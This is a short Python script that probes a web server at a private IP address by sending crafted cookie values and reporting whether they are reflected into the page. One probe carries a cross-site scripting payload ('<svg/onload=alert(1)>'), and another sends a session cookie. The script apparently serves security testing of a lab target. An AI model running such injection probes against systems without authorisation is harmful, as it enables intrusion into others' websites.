import urllib.request, re

def fetch(cookie):
    req = urllib.request.Request('http://10.113.161.234/')
    if cookie:
        req.add_header('Cookie', cookie)
    r = urllib.request.urlopen(req, timeout=10)
    return r.read().decode('utf-8', 'replace')

def h3s(b):
    return re.findall(r'<h3>(.*?)</h3>', b)

def show(label, cookie):
    b = fetch(cookie)
    print(f'--- {label} (cookie={cookie!r}) ---')
    for h in h3s(b):
        print('  h3:', h[:200])
    if cookie:
        val = cookie.split('=', 1)[1].split(';')[0]
        if val and val in b:
            i = b.find(val)
            print(f'  >>> REFLECTED at {i}: ...{b[max(0,i-80):i+len(val)+80]!r}...')
    print()

show('no cookie', None)
show('countdown', 'countdown=PROBE_TOKEN_42')
show('xss', 'countdown=<svg/onload=alert(1)>')
show('date',     'countdown=2099-01-01T00:00:00')
show('weird-name', 'countDown=PROBE_TOKEN_42')
show('expires', 'expires=PROBE_TOKEN_42')
show('with session', 'session=MTkyLjE2OC4xOTguMTA4; countdown=PROBE_TOKEN_42')
